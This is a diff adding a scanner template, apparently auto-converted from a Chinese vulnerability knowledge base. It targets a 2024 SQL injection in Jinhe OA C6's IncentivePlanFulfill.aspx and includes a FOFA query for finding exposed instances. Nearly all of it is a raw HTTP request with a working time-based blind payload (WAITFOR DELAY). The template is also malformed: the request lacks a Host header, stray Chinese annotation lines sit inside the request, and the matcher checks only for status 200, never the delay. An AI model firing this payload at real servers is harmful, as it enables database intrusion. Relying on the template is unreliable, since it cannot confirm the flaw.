@@ -1,0 +1,43 @@
+id: poc-gmsigvxcfix8lg94
+info:
+  name: 金和OA-C6-IncentivePlanFulfill.aspx SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmsigvxcfix8lg94'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gmsigvxcfix8lg94
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
+
+
+    Connection: close
+
+
+    Cookie: ASP.NET_SessionId=0uha1u0nhrn4meghddjiwu0y
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
